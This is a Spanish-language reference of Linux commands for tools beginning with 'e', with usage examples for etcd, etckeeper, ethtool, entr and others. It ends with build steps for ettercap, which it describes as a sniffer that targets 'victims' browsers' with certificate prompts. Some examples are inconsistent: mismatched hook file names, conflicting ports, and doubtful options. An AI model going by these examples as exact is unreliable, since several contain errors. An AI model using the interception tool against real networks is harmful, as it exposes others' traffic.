$ mime-extractor mensaje.eml (extraer su contenido, tanto adjuntos como metadatos)
$ mime-extractor -o /ruta/de/salida mensaje.eml (lo mismo especificando una ruta para los adjuntos)
$ mime-dump mensaje.eml (inspeccionar cómo está estructurado un correo MIME)
$ mime-dump -v mensaje.eml (análisis más detallado)


enscribe
Herramienta que convierte imágenes en sonido utilizando Fast Fourier Transform, [Transformación Rápida de Fourier - FFT]. Básicamente, toma una imagen como entrada, la descompone en sus componentes de frecuencia y luego convierte esas frecuencias en una señal de audio.
El lado izquierdo de la imagen es el extremo de baja frecuencia y el derecho es el extremo alto, hasta justo por debajo del límite de Nyquist si así lo desea. Hay varios parámetros ajustables en cuanto a cómo se convierte el color en sonido estéreo y el rango de frecuencia que se utilizará. Esta conversión se puede utilizar para crear marcas de agua de audio resistentes o simplemente para crear sonidos interesantes a partir de imágenes.
$ enscribe imagen.png -o salida.wav (convertir una imagen en un archivo de sonido)
$ enscribe imagen.png -o salida.wav -r 48000 -b 24 (generar un archivo de audio con una tasa de muestreo de 48 kHz y una profundidad de bits de 24)


enscript
Aplicatión que toma archivos ASCII y los convierte a PostScript, HTML o RTF.
$ enscript -J frases -ptexto.ps texto.txt (con título [J] y salida como "texto.ps" sobre el archivo texto.txt)
$ enscript -2 texto.txt (imprimir texto.txt a dos columnas)
$ enscript -B -2r texto.txt (Imprimir texto.txt sin cabecera [B], a dos columnas y hacerlo apaisado)


ent
Programa de prueba de secuencias de números pseudoaleatorios útil para quienes evalúan generadores de números pseudoaleatorios para aplicaciones de cifrado y muestreo estadístico, algoritmos de compresión...
$ ent datos_aleatorios.bin (analizará datos_aleatorios.bin y dará un resumen de las pruebas realizadas)
1.-
Analizar datos generados aleatoriamente
$ dd if=/dev/urandom of=datos_aleatorios.bin bs=1M count=1
$ ent datos_aleatorios.bin
La salida típica podría verse así:
          Entropy = 7.999999 bits per byte.
          Optimum compression would reduce the size of this 1048576 byte file by 0 percent.
          Chi square distribution for 256 samples is 248.00, and randomly would exceed this value 0.00 percent of the time.
          Arithmetic mean value of data bytes is 127.5 (127.0 = random).
          Monte Carlo value for Pi is 3.141592653589793.


entagged
Etiquetador de archivos de audio escrito en Java que utiliza la base de datos en línea FreeDB para obtener información de metadatos [etiquetas] de losd archivos. Soporta varios formatos de audio como APE, FLAC, MP3, MPC, OGG, WMA.
$ entagged --artist "The Beatles" --album "Sgt. Pepper's Lonely Hearts Club Band" song.mp3 (etiquetar un archivo específico)
$ entagged --artist "Radiohead" /ruta/a/carpeta/ (etiquetar todos los archivos en una carpeta)
$ entagged --list-tags song.mp3 (obtener todas las etiquetas de un archivo)
$ entagged --update song.mp3 (actualizar las etiquetas de un archivo existente)
$ entagged --search "genre=rock" /ruta/a/carpeta/ (buscar archivos por etiqueta)


entr
Ejecuta comandos arbitrarios cuando cambian los archivos. El Event Notify Test Runner [ejecutor de pruebas de notificación de eventos - entr] ejecuta comandos arbitrarios cuando cambian los archivos. Los cambios se detectan a través de la interfaz del kernel inotify.
$ ls main.c | entr gcc -o main main.c (un archivo main.c que se quiere recompilar con gcc cada vez que se modifica)
$ find . -name "*.py" | entr python test.py (lista todos los archivos .py en el directorio actual y subdirectorios y cada vez que se modifica un archivo .py, entr ejecuta python test.py)
$ ls index.html | entr pkill -HUP -f "python -m http.server" (recarga el servidor cada vez que cambia index.html)
$ ls archivo.txt | entr echo "¡El archivo cambió!" (cada vez que se modifica archivo.txt, se verá el mensaje en la terminal)
$ ls *.txt | entr cat archivo1.txt (monitorear todos los archivos .txt y ejecutar cat archivo1.txt cuando cualquiera cambia)
$ ls main.py | entr -r python main.py (si cambia main.py, entr termina el proceso anterior y ejecuta python main.py de nuevo)XS


entropybroker
Infraestructura para distribuir números aleatorios criptográficamente seguros desde uno o más servidores a uno o más clientes. Es un servidor que recolecta datos de entropía desde diferentes clientes. Para utilizar este comando, normalmente se configura el servidor y luego conectar a varios clientes para que envíen datos de entropía al servidor. Consta de los ejecutables: eb_client_egd, eb_client_file, eb_client_kernel_generic, eb_client_linux_kernel, eb_proxy_knuth_b, eb_proxy_knuth_m, eb_server_Araneus_Alea, eb_server_ComScire_R2000KU, eb_server_audio, eb_server_egd, eb_server_ext_proc, eb_server_linux_kernel, eb_server_push_file, eb_server_smartcard, eb_server_stream, eb_server_timers, eb_server_usb, eb_server_v4l y entropy_broker
# entropybroker (iniciar el servidor en el servidor central en el puerto 8080)
Configuración del servidor:
# nano /etc/entropybroker.conf
Con el contenido:
[global]
port = 9000
verbosity = 2
Y luego iniciar el servidor especificando este archivo de configuración:
# entropybroker -f /etc/entropybroker.conf
Los clientes son programas que generan entropía y la envían al servidor.
# entropybroker-client --host <servidor_ip> --port <puerto> (la dirección IP del servidor que ejecuta entropybroker y <puerto> con el puerto que configurado o el predeterminado [8080])
# entropybroker -s (verificar las estadísticas y el estado del servidor que mostrará cuántos clientes están conectados y cuánta entropía está siendo generada y procesada)


enum
permite enumerar números entre dos valores, con opciones para definir el paso, la cantidad de números a generar y el formato de salida. Es útil para generar secuencias de números con control sobre el formato y la interpretación de la entrada y salida. Está diseñado para ser un reemplazo directo de GNU seq.
$ enum 1 10 (generar una secuencia simple del 1 al 10)
$ enum -r 1 10 (generar un número aleatorio entre 1 y 10)
$ enum -f "%02d" 1 5 (generar números del 1 al 5 con formato de dos dígitos)
$ enum -p 2 1 10 (generqar números con dos decimales entre entre el 1 y el 10)
$ enum -c 55 78 (enumerar caracteres del 58 al 78)
$ enum -b "linux es un sistema genial" 5x (imprimir 5 veces la frase)
$ enum 1 2 10 (de 1 a 10 con incremento de 2)
$ enum 10 -2 1 (del 10 al 1 decreciendo de 2)


env
Muestra las variables de entorno
$ env | grep DISPLAY
$ env | grep PATH | tr ':' '\n'
Algunas opciones para grep: SHELL, USER, KEYBOARD, LANG..


env2
Convierte variables de entorno entre lenguajes de programación. Genera código de configuración de entorno para el lenguaje de programación de destino. Por ejemplo, convierte el script de configuración de csh a bash o viceversa. Admite bash, csh, ksh, modulecmd, perl, plist, sh, tclsh, tcsh, vim, yaml y zsh.
$ env2 -f config.csh -t bash (convertir variables de un archivo csh a bash)
$ env2 -f config.sh -t csh (convertir variables de entorno a un formato compatible con csh)
$ env2 -f config.sh -t python (convertir variables de entorno a otro lenguaje de programación)
$ env2 -f config.sh -t json(convertir las variables de entorno a un formato JSON)


environment-modules
Herramienta para gestionar el entorno de usuario permitiendo cargar y descargar configuraciones de entorno dinámicamente, como cambiar versiones de programas, librerías, compiladores, etc., sin alterar el sistema. Funciona principalmente manipulando variables como PATH, LD_LIBRARY_PATH, MANPATH, etc., de forma automática, ordenada y sin tener que tocar ~/.bashrc manualmente. Incluye las aplicaciones add.modules, envml, mkroot y modulecmd.
$ add.modules (agrega ". /usr/share/modules/init/bash" en .bashrc para asegurar acceso a los módulos para todos los subshells. Los originales se guardan con extensión .old)
$ mkroot /opt/mis_modulos (crea la estructura básica de directorios para alojar tus propios módulos)
$ module refresh (refrescar los módulos)
$ module list (ver módulos cargados)
$ module show gcc/11.2 (información sobre un módulo)
$ module purge (purgar todos los módulos)
$ envml save dev_environment (guardar una colección de módulos cargados)
$ envml restore dev_environment (restaurar una colección)
$ module unload python/3.8 (descargar la versión especificada)
$ module load /usr/share/modules/modulefiles/module-git (cargar el módulo git)


envstore
Almacén de variables de entorno en todos los procesos del shell. envstore permite guardar las variables de entorno en un almacén independiente, enumerarlas, borrarlas y volver a cargarlas.
$ envstore l (listar variables guardadas)
$ envstore c (borrar todas la variables almacenadas)
$ envstore e (restaruar todas las variables guardadas)
$ envstore s SHELL (guardar la variable SHELL en el almacen)
$ envstore r PATH (borra la variable PATH del almacen)


envsubst
En el modo de funcionamiento normal, la entrada estándar se copia en la salida estándar y las referencias a las variables de entorno de la forma $VARIABLE o ${VARIABLE} se reemplazan por los valores correspondientes. Si se proporciona SHELL-FORMAT, solo se sustituyen las variables de entorno a las que se hace referencia en SHELL-FORMAT; de lo contrario, se sustituyen todas las referencias de variables de entorno que aparecen en la entrada estándar. Cuando se usa --variables, la entrada estándar se ignora y la salida consta de las variables de entorno a las que se hace referencia en SHELL-FORMAT, una por línea.
Ejemplo
Crear el archivo buendia.txt con el siguiente texto:
$ echo "Hola usuario $USER estás con $DESKTOP_SESSION. Que tengas $BUEN!" > buendia.txt
Exportar la variable y luego lanzar:
  $ export BUEN="buen dia"
  $ envsubst < buendia.txt
  Hola usuario templix estás con LXDE. Que tengas buen dia!
Eliminanos la variable:
  $ unset BUEN
Volvemos a lanzar envsubst
  $ envsubst < buendia.txt
  Hola usuario templix estás con LXDE. Que tengas !


eoconv
Convertir archivos de texto entre distintas codificaciones de esperanto
$ eoconv --from=iso-8859-2 --to=utf-8 input.txt > output.txt (convertir un archivo a codificación en utf-8 y guardarlo en output.txt)


eot-utils
Herramientas para convertir de formato de fuente OTF [OpenType Font] o TTF [TrueType] a EOT [Embedded OpenType]. Las utilidades EOT son los dos programas mkeot y eotinfo. El primero crea un archivo EOT (Embedded OpenType) a partir de una fuente OpenType o TrueType y las URL de una o más páginas web. mkeot respeta los bits de incrustación TrueType.
$ ttf2eot < fuente.ttf > fuente.eot (toma un archivo TTF y genera su versión EOT)


eot2ttf
Paquete que utiliza libeot para convertir .eot [Embedded OpenType] a .ttf [TrueType]. Libeot es una biblioteca para analizar archivos OpenType integrados y convertirlos a otros formatos.
$ eot2ttf fuente.eot (generará un archivo fuente.ttf en el mismo directorio)


epub-utils
Herramientas para trabajar con el formato de archivo EPUB. Las herramientas de ebook proporcionan formas de acceder y convertir diferentes formatos de archivos de libros electrónicos. Este paquete contiene las siguientes utilidades: einfo [proporciona información básica sobre un documento EPUB como metadatos, orden de lectura, etc.] y lit2epub [convierte un archivo LIT a EPUB].
$ einfo -v libro.epub (muestra si existen errores)
$ einfo -vv libro.epub (habilita mensajes de advertencia)
$ einfo -t id51 libro.epub (imprime información del id51 que se obtiene con el comando anterior)
$ einfo -p libro.epub (impresión del libro)


epubcheck
Herramienta para validar archivos EPUB que puede detectar muchos tipos de errores.
$ epubcheck archivo.epub (forma básica)
$ epubcheck -l (lista los mensajes y los niveles de gravedad)
$ epubcheck --out archivo archivo.epub (guarda el informe en archivo en xml)
$ epubcheck -e -w archivo.epub (solo muestra mensajes de gravedad, error y advertencia en la salida)


epylog
Analizador syslog que se ejecuta periódicamente. Examina los registros procesando algunas de las entradas para presentarlas en un formato más comprensible. Puede enviar el resultado por correo.
# epylog --last day (del último dia. Otras opciones: "hour" [h], "week" [w], "month" [m])
# epylog --last 2w (de las últimas 2 semanas)
# epylog --cron (ejecutarlo periodicamente)


eql
Herramienta que permite distribuir la carga de tráfico de red entre varias interfaces de red físicas, como eth0, eth1, ppp0, etc y está especificamente diseñada para combinar múltiples enlaces de red en una sola interfaz lógica, lo que permite aumentar el ancho de banda y mejorar la redundancia.
# modprobe eql (cargar el módulo del kernel)
# lsmod | grep eql (verificar que el módulo está activo)
# ip link add eql0 type eql (crear la interfaz eql)
# ip addr add 192.168.1.1/24 dev eql0 (asignar una dirección IP)
# ip link set eql0 up (y activarla)
# eql_enslave eql0 eth0 (agregar eth0 a la interfaz eql0)
# eql_enslave eql0 eth1 (agregar otro [eth1] para compartir el tráfico de red)
# ip route add default via 192.168.1.254 dev eql0 (establecer 192.168.1.254 como la puerta de enlace para todo el tráfico saliente a través de eql0)
$ cat /proc/net/eql (ver las interfaces agregadas al balanceador)
$ ip addr show eql0 (otra forma de verlas)


equivs
Este paquete proporciona una herramienta para crear paquetes Debian y evitar sus dependencias. Normalmente, estos paquetes contienen sólo información de dependencias, pero también pueden incluir archivos normales instalados como otros paquetes. Otro uso es evitar la comprobación de dependencias: al permitir que dpkg piense que un nombre y una versión de paquete en particular están instalados cuando no lo están, puede evitar errores en las dependencias de otros paquetes.
$ equivs-control paquete (En un directorio vacio generará el archivo paquete, que es un archivo de control que se tendrá que editar y completar con los datos que se quiera)
$ equivs-build paquete (generará paquete.deb en el directorio actual junto con los build y changes)
El paquete.deb puede instalarse aunque no contenga ningún tipo de ejecutable:
# dpkg -i paquete.deb
Solo sirve para que las dependencias que hemos colocado en el archivo de control se consideren instaladas.


erfs
Sistema de archivos en el que los datos cifrados se almacenan en un servidor remoto en la nube sin tener que confiar en el servidor. Todo el material clave se crea en la computadora del usuario y nunca se almacena ni se transfiere al servidor. Todos los datos se cifran localmente incluido el nombre del archivo. Solo los datos cifrados se almacenan en la nube. Los datos permanecen seguros incluso si el servidor en la nube se ve comprometido. No necesita privilegios de superusuario ni de raíz.
$ erfs mount aDe5F2ik3x35x7pfAEAWdC5Y ~/secure (montar y usar el sistema de archivos)


errbot
Es un chatbot escrito en Python facil de ampliar que permite iniciar scripts de forma interactiva desde salas de chat por cualquier motivo: humor aleatorio, chatops, automatización, monitorear commits, notificaciones, activar alertas...
$ mkdir myerrbot && cd myerrbot (crear un directorio para errbot y entra en él)
$ errbot --init (inicializa una configuración predeterminada)
$ errbot --daemon (inicia como demonio)
$ errbot (inicia en modo consola interactiva)
 -> !help (lista los comandos disponibles)
 -> !help comando (información sobre un comando especifico)


errno
[moreutils]. Muestra los errores de código y sus descripciones.
$ errno -l (Todo el listado)
$ errno -s desconocido (Busca del listado el que contenga la descripción "desconocido")


es2_info
[= es2_info.x86_64-linux-gnu]. Muestra información sobre las extensiones OpenGL ES soportadas.
$ es2_info


esbuild
Herramienta de construcción y empaquetado para JavaScript y TypeScript conocida por su velocidad y eficiencia. Está diseñada para optimizar y empaquetar código para su despliegue en aplicaciones web.
$ esbuild index.js --bundle --outfile=bundle.js (empaquetar index.js y generará un archivo bundle.js que contiene todo el código necesario para ejecutar la aplicación)
$ esbuild index.js --bundle --minify --outfile=bundle.min.js (generar un archivo bundle.min.js que es una versión minificada del código empaquetado)
$ esbuild app.ts --bundle --outfile=bundle.js (empaquetar TypeScript)
$ esbuild app.ts --bundle --servedir=dist (servirá el contenido del directorio dist en un servidor local)


escputil
Utilidad para limpiar y alinear los cabezales y comprobar los niveles de tinta de las impresoras Epson Stylus.
$ escputil -s -P impresora (mostrar elestado de la impresora especiicada, por defecto la del sistema)
$ escputil -c (limpiar los cabezales de la impresora)
$ escputil -q 0 (comprobar niveles de tinta específicos, por ejemplo, negro [1 = azul, 2 = verde, etc.])
$ escputil -a (alinear los cabezales de la impresora)
$ escputil -M (ver modelos soportados)
$ escputil -n (prueba de inyectores. Si se ven espacios, limpiar cabezales)


esetroot
[eterm-utils]. Configura el fondo de Eterm para transparencia con administradores de ventanas distintos a Enlightenment. kEsetroot se proporciona para KDE.
$ esetroot -s /home/usuario/imagenes/imagen.jpg (Escala al tamaño de la pantalla)
$ esetroot -b red -f /home/usuario/imagenes/imagen-jpg (Colorea en rojo la parte de la pantalla no ocupada por la imágen con la opción -f)
otras opciones:
      -c (Centrar la imagen)
      -f (Respetando las proporciones)
      -m (en mosaico)


esmtp
Agente de transferencia de correo [Mail Transfer Agent - MTA] que solo retransmite correo. No recibe correo, ni amplía alias ni administra una cola, pero puede entregar correo localmente a través de un MDA [Mail Delivery Agent] como procmail y maildrop.
Contenido mínimo del archivo de confgiuración del usuario:
$ nano  ~/.esmtprc
        hostname = smtp.example.com:587
        username = usuario@example.com
        password = "contraseña"
        starttls = enabled
        mda = "/usr/bin/procmail -d %T"
Se especifica servidor SMTP que retransmitirá los correos, credenciales de autentificación, encriptación con STARTTLS y encargado de la entrega final
$ echo -e "Subject: Prueba\n\nEste es un mensaje de prueba." | esmtp destinatario@example.com (enviar un correo)
$ echo "Este es el mensaje." | mutt -s "Asunto" -a archivo.pdf -- destinatario@example.com (enviar un archivo con mutt que detectará automáticamente esmtp como el MTA si está bien configurado)
$ echo "Este es un correo desde mailx con esmtp" | mailx -s "Correo con mailx" destinatario@example.com (usando mailx)
$ echo "Mensaje de prueba" | esmtp -v destinatario@example.com (Si algo falla, usar la opción -v y revisar el archivo de configuración ~/.esmtprc y probar con otro servidor SMTP)
1.-
Enviar correo con sendmail
$ echo "Cuerpo del mensaje" | esmtp -t <<EOF
  To: destinatario@example.com
  Subject: Prueba de esmtp


espctag
Editor de etiquetas que puede leer o escribir etiquetas ID666 de archivos SPC, formato de audio asociado con el chip de sonido SPC-700 de la Super Nintendo [SNES] utilizado para almacenar música y efectos de sonido de videojuegos. Las etiquetas ID666 son metadatos incrustados en estos archivos que contienen información como el título de la canción, el nombre del juego, el artista, la fecha de extracción, entre otros.
$ espctag cancion.spc (muestra las etiquetas ID666 del archivo SPC especificado)
$ espctag --song --game cancion.spc (mostrar campos específicos)
$ espctag --set --song="Boss Battle" --artist="Nobuo Uematsu" cancion.spc (cambia el título de la canción a "Boss Battle" y el artista a "Nobuo Uematsu" en cancion.spc)
$ espctag -v -e --set --artist="Unknown" cancion1.spc cancion2.spc (intenta establecer el artista como "Unknown" en ambos archivos, mostrando detalles y continuando incluso si uno falla)


espeak
Hablando la terminal. Mismas opciones que aoss espeak.
$ echo {1..3}" sistemas quedaron y naturalmente eran linux  " | espeak -ves -s 100


espeakup
demonio que se utiliza para proporcionar acceso a la síntesis de voz a través de la combinación de Speakup, que es un lector de pantalla para sistemas basados en texto, y Espeak, que es un sintetizador de voz de software. Su objetivo principal es ayudar a los usuarios con discapacidades visuales a interactuar con el sistema operativo y leer texto en la pantalla. El demonio conecta los módulos del kernel de Speakup al sintetizador de voz Espeak a través de un dispositivo especial llamado /dev/softsynth. Esto permite que el texto que se muestra en la consola sea convertido a voz, facilitando la lectura del contenido.
$ espeakup & (iniciar el demonio espeakup en segundo plano)
$ espeak -s 150 "Hola, esto es un ejemplo de uso de Espeak." (la frase a 150 palabras por minuto)


et
[Eternal Terminal]. Shell remoto, que a diferencia de una sesión normal ssh, aunque se tenga un cambio de ip o un corte de red, se vuelve a conectar automáticamente sin interrumpir la sesión. En debian, añadir a /etc/apt/sources.list la linea:
	deb https://mistertea.github.io/debian-et/debian-source/ stretch main
Y añadir la clave:
# curl -sS https://mistertea.github.io/debian-et/et.gpg | sudo apt-key add -
Instalar con el clásico:
# apt install et


eta
Herramienta de línea de comandos que se utiliza para monitorear el progreso de procesos y estimar el tiempo restante para su finalización.
$ eta -- dd if=/dev/zero of=largefile bs=1M count=1000 (monitorea el progreso de la copia y muestra una barra de progreso junto con el tiempo estimado de finalización)
$ eta --target 10000 -- ./count_lines.sh largefile.txt (indica que el valor objetivo es 10000 líneas y muestra el tiempo estimado de finalización)


etc1tool
Utilidad que permite codificar imágenes PNG según el estándar de compresión ETC1 [Ericson Texture Compression] y decodificar imágenes comprimidas ETC1 nuevamente a PNG. Es un formato de compresión de texturas utilizado en gráficos 3D en dispositivos móviles, especialmente en Android. No soporta transparencia, por lo que si el PNG de entrada tiene un canal alfa, se perderá.
$ etc1tool imagen.png --encode imagen.pkm (convertir imagen.png a imagen.pkm, que es el formato de textura comprimida ETC1)
$ etc1tool imagen.pkm --decode imagen_decodificada.png (convierte imagen.pkm nuevamente a imagen_decodificada.png)
$ etc1tool imagen.png --encode imagen.pkm --format rgb8 (indica que la imagen usa un formato de color de 8 bits por canal)
$ etc1tool imagen.pkm --show-info (muestra información sobre la imagen imagen.pkm, como dimensiones y si está comprimida correctamente)
$ etc1tool imagen.png --encode imagen.pkm --quality best (intenta obtener la mejor calidad de compresión posible)
$ etc1tool imagen.png --encode imagen.pkm --size 256x256 (redimensiona la imagen a 256x256 antes de codificarla)


etcd-discovery
Código que potencia el servicio público en https://discovery.etcd.io. Este paquete proporciona una URL de descubrimiento inicial independiente si se contacta con https://discov si su servidor no tiene conexión a Internet. etcd es un almacén de clave-valor comúnmente utilizado en sistemas distribuidos como Kubernetes para almacenar la configuración del clúster y coordinar la comunicación entre nodos. El servicio de descubrimiento es una herramienta que facilita la formación de un clúster que, cuando se inicia, los nodos necesitan conocerse entre sí para formar el clúster. El servicio de descubrimiento proporciona una URL única que los nodos pueden usar para registrarse y descubrir a otros miembros del clúster.
Generar una URL de descubrimiento única utilizando el servicio público en https://discovery.etcd.io. Esta URL actúa como un punto de encuentro para los nodos del clúster. Ejemplo de URL generada:
        https://discovery.etcd.io/3e86b59982e49066c5d813af1c2e2579
Cada nodo del clúster de etcd se configura con esta URL de descubrimiento. Cuando los nodos se inician, se registran en esta URL y descubren a otros nodos registrados. Una vez que los nodos se han registrado y descubierto entre sí, forman un clúster de etcd. Suponiendo que se está configurando un clúster de etcd con tres nodos, un ejemplo de cómo se podría usar el servicio de descubrimiento: Se accede con el navegador a:
        https://discovery.etcd.io/new
O con curl:
        $ curl https://discovery.etcd.io/new?size=3
Devolverá una URL única, por ejemplo:
        https://discovery.etcd.io/3e86b59982e49066c5d813af1c2e2579
Y en cada nodo, configurar etcd para usar la URL de descubrimiento. Por ejemplo, en un nodo:
        $ etcd --name node1 --initial-advertise-peer-urls http://192.168.1.101:2380 \
             --listen-peer-urls http://192.168.1.101:2380 \
             --discovery https://discovery.etcd.io/3e86b59982e49066c5d813af1c2e2579
En otro nodo:
        $ etcd --name node2 --initial-advertise-peer-urls http://192.168.1.102:2380 \
             --listen-peer-urls http://192.168.1.102:2380 \
             --discovery https://discovery.etcd.io/3e86b59982e49066c5d813af1c2e2579
Y en el tercer nodo:
        $ etcd --name node3 --initial-advertise-peer-urls http://192.168.1.103:2380 \
             --listen-peer-urls http://192.168.1.103:2380 \
             --discovery https://discovery.etcd.io/3e86b59982e49066c5d813af1c2e2579
Una vez que los tres nodos se hayan iniciado y registrado en la URL de descubrimiento, formarán un clúster de etcd.


etcd-server
Un almacén de valores clave de alta disponibilidad para la configuración compartida y el descubrimiento de servicios. Es comúnmente utilizado en sistemas como Kubernetes para almacenar configuraciones de clúster y datos de coordinación.
$ etcd --name mi-nodo --data-dir /var/lib/etcd (inicia un nodo de etcd con el nombre mi-nodo, almacenando sus datos en /var/lib/etcd)
$ etcd --name nodo1 --data-dir /var/lib/etcd --listen-client-urls http://localhost:2379 --advertise-client-urls http://localhost:2379 (inicia un nodo etcd escuchando en el puerto 2379 solo en localhost)
$ etcdctl put clave "Hola Mundo" (guardar un valor)
$ etcdctl get clave (leer el valor almacenado)
$ etcdctl get "" --prefix (listar claves almacenadas)
$ etcdctl endpoint status --write-out=table (ver el estado del clúster)
1.-
Ejemplo de de iniciar tres nodos en diferentes máaquina, por ejemplo, en una configuración de tres nodos:
Nodo 1:
      $ etcd --name nodo1 --initial-advertise-peer-urls http://192.168.1.1:2380 \
      --listen-peer-urls http://192.168.1.1:2380 \
      --listen-client-urls http://192.168.1.1:2379 \
      --advertise-client-urls http://192.168.1.1:2379 \
      --initial-cluster nodo1=http://192.168.1.1:2380,nodo2=http://192.168.1.2:2380,nodo3=http://192.168.1.3:2380 \
      --data-dir /var/lib/etcd
Nodo 2:
      $ etcd --name nodo2 --initial-advertise-peer-urls http://192.168.1.2:2380 \
      --listen-peer-urls http://192.168.1.2:2380 \
      --listen-client-urls http://192.168.1.2:2379 \
      --advertise-client-urls http://192.168.1.2:2379 \
      --initial-cluster nodo1=http://192.168.1.1:2380,nodo2=http://192.168.1.2:2380,nodo3=http://192.168.1.3:2380 \
      --data-dir /var/lib/etcd
Nodo 3:
      $ etcd --name nodo3 --initial-advertise-peer-urls http://192.168.1.3:2380 \
      --listen-peer-urls http://192.168.1.3:2380 \
      --listen-client-urls http://192.168.1.3:2379 \
      --advertise-client-urls http://192.168.1.3:2379 \
      --initial-cluster nodo1=http://192.168.1.1:2380,nodo2=http://192.168.1.2:2380,nodo3=http://192.168.1.3:2380 \
      --data-dir /var/lib/etcd
Estos nodos forman un clúster distribuido de etcd.


etckeeper
Herramienta que permite almacenar el directorio /etc, que es donde se almacenan los archivos de configuración, en un repositorio git, mercurial, brz o darcs. Se conecta a APT para confirmar automáticamente los cambios realizados en /etc durante las actualizaciones de paquetes. Realiza un seguimiento de los metadatos de los archivos que los sistemas de control de versiones [Version Control Systems - VCS] normalmente no admiten, pero que son importantes para /etc, como los permisos de /etc/shadow. Ideal para mantener un historial de cambios, revertir errores o documentar modificaciones en /etc.
Archivo de configuración para establecer el VCS que se usa, por defecto git:
# nano /etc/etckeeper/etckeeper.conf
       # The VCS to use.
       #VCS="hg"
       VCS="git"
       #VCS="bzr"
       #VCS="darcs"
       PUSH_REMOTE="origin"
Y para que realice los PUSH_REMOTE automaticamente ha de configurarse:
# nano /etc/etckeeper/commit.d/60push-remote
    #!/bin/sh
    cd /etc
    if [ "$VCS" = "git" ]; then
        git push "$PUSH_REMOTE" master || {
            echo "Error: No se pudo hacer push al remoto $PUSH_REMOTE" >&2
            exit 1
        }
    fi
# chmod +x /etc/etckeeper/commit.d/50push-remote (y darle permisos de ejecución)
Con la base realizada, puede empezar a usarse la aplicación.
# cd /etc (entrar en el directorio)
# etckeeper init (crea un repositorio Git en /etc/.git y prepara el directorio /etc para el control de versiones)
# etckeeper commit "Primera confirmación inicial de /etc" (registra todos los archivos actuales de /etc en el repositorio con el mensaje especificado)
A partir de este momento cualquier cambio que realice el usuario en algún archivo en /etc ha lanzarse:
# etckeeper commit "Añadida entrada para servidor-local en /etc/XXXX"
Si la modificación procede de APT por la instalación de un paquete, etckeeper detecta los cambios y automaticamente hace una confirmación al finalizar la instalación.
# etckeeper vcs log (verificar el historial)
# etckeeper vcs status (ver qué ha cambiado antes de confirmarlo)
# etckeeper commit "Actualizados hosts y resolv.conf" (confirmar los cambios de varios archivos)
# etckeeper vcs checkout abcd123 /etc/hosts (volver al estado antes de añadir una entrada)
# etckeeper commit "Revertido cambio en /etc/hosts a estado inicial" (y confirmar el cambio)
# etckeeper vcs diff abcd123 efgh456 (comparar qué cambió entre dos confirmaciones)
Nota.- Lo inmportante de este paquete, es su integración con APT. Cada vez que se usa para instalar, actualizar o eliminar paquetes, etckeeper ejecuta un "hook" que detecta cambios en /etc y los registra automáticamente en el repositorio con un mensaje como "committing changes in /etc after apt run" sin intervención manual y los permisos y otros metadatos los guarda en el archivo especial .etckeeper.


eterm
[eterm-utils]. Emulador de terminal en color diseñado por y para Enlightenment. Este terminal es altamente configurable y dispone de una gran cantidad de temas disponibles. Su gran característica principal son las transparencias. eterm-utils dispone de varios ejecutables que todos se lanzan con la primera letra en mayúscula: Esetroot [ver] y kEsetroot para kde, Etbg [establece la imagen de fondo de Eterm], Etbg_update_list [actualiza listas de mapas de píxeles para los menús], Etcolors [muestra una tabla del mapa de colores actual], Etsearch [busca en el historial del búfer hacia atrás] y Ettable [muestra el conjunto de caracteres de la fuente actual].
$ Eterm -D 1 -f green -O (En el segundo escritorio [-D 1] con las fuentes en verde  [-f]  y transparente [-O]
Algunas opciones:
	--buttonbar false (Sin la barra del menú)
	-T “titulo de la terminal”
	-b yellow (color de fondo)
	-c red (Color del cursor)
	-g 50x10 (Medidas. 50 de largo por 10 de ancho)
	-S (Abrir en todos los escritorios)
	-e comando (Cuando termine de ejecutar el comando se cierra)


etherwake
Arrancar un ordenador [especificado por su MAC] de forma remota una vez activado en la BIOS "Wake On Lan"
# etherwake -i eth0 00:16:E6:31:1A:22


ethflux
Herramienta diseñada para monitorizar y analizar el rendimiento de las interfaces de red mediante ioctl SIOCETHTOOL al estilo de ethtool y enviarla a una base de datos InfluxDB.
Ejemplo de configuración de la base de datos InfluxDB:
$ nano config.yaml
       influxdb:
         url: "http://localhost:8086"
         database: "metrics"
         username: "usuario"
         password: "contraseña"
       interfaces:
         - "eth0"
         - "eth1"
Se especifica la url especifica la dirección de InfluxDB, nombre de la base de datos donde se almacenarán las métricas,  las credenciales de acceso a InfluxDB y lista de las interfaces de red que se monitorizarán.
$ ethflux -config config.yaml (iniciará la recopilación de datos de las interfaces especificadas y las enviará a la base de datos InfluxDB según la configuración proporcionada)


ethstats
muestra el uso y las estadísticas de nuestra red.
# ethstats


ethstatus
Monitor de estadísticas de internet
# ethstatus


ethtool
Averiguar/modificar la tarjeta de red
# ethtool eth0  (Para ver la configuración actual de la tarjeta)
# ethtool -i eth0  (conocer el driver de la tarjeta de red)
# ethtool --test eth0 (Realizar un test de la tarjeta si está soportado)
# ethtool -S eth0 (Consultar estadísticas de la red)
# ethtool -p eth0 10 (Hacer parpadear los lets de la interfaz de red)


ethumb
Programa que crea miniaturas a partir de imágenes del fichero.
$ ethumb -f=png archivo.pdf (crear un thumbnail de un pdf en png)
$ ethumb -p=3 -f=png archivo.pdf (tomando como imagen la página 3)


etktab
Editor de tablaturas que representan las cuerdas de la guitarra y los trastes en los que se debe presionar en ASCII. Este programa se utiliza para escribir tablaturas de guitarra en el estilo típico de tablatura ASCII, que se encuentra a menudo en Internet.
Ejemplo de tablatura [acorde de G (Sol)]:
        e|---0---2---3---| (1ra cuerda)
        B|---0---3-------| (2da cuerda)
        G|---0-----------| (3ra cuerda)
        D|---2-----------| (4ta cuerda)
        A|---2-----------| (5ta cuerda)
        E|---0-----------| (6ta cuerda)
Nota.- Cada línea representa una cuerda de la guitarra, desde la más aguda "e" hasta la más grave "E", y los números indican los trastes que se deben presionar.
$ eTktab (iniciar la interfaz y con el teclado marcar notas y acordes. Pulsando "help" se muestran todos las equivalencias en el teclado)
$ cat musica.et6 (mostrar la tabladura)


ettercap
[Dependencias: libcap2 libnet1 zlib1g libpthread-stubs0 libpcre3-dev libpcap-dev libcap-dev libnet6-1.3-0 libnet1-dev libssl-dev ncurses-bin libncurses5-dev libsdl-pango1 libatk1.0-dev]
Snifador de red. Muestra pantallas solicitando aceptación de certificado en los navegadores de las victimas.
descargar de http://ettercap.sourceforge.net/ y descomprimir
$ wget http://prdownloads.sourceforge.net/ettercap/ettercap-NG-0.7.3.tar.gz?download
$ wget http://sourceforge.net/projects/ettercap/files/ettercap/NG-0.7.3/ettercap-NG-0.7.3.tar.gz/download
$ tar -zvxf paquete
$ cd ettercap-NG-0.7.3
	$ ./configure
	$ make
	# make install
